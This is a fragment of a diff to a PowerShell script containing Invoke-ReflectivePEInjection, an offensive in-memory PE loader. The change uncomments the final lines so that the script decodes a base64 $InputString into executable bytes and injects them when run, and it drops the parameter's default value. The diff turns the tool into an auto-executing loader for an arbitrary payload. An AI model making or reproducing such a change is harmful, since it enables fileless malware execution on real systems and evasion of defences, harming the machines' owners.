@@ -830,7 +830,7 @@ Param(
     [Parameter(ParameterSetName = "Bytes", Position = 0, Mandatory = $false)]
     [ValidateNotNullOrEmpty()]
     [Byte[]]
-    $PEBytes = [System.Convert]::FromBase64String($InputString),
+    $PEBytes,
 	
 	[Parameter(Position = 1)]
 	[String[]]
@@ -3583,6 +3583,6 @@ Function Main
 Main
 }
 
-#$PEBytes = [System.Convert]::FromBase64String($InputString)
-#Invoke-ReflectivePEInjection -PEBytes $PEBytes
+$PEBytes = [System.Convert]::FromBase64String($InputString)
+Invoke-ReflectivePEInjection -PEBytes $PEBytes
 
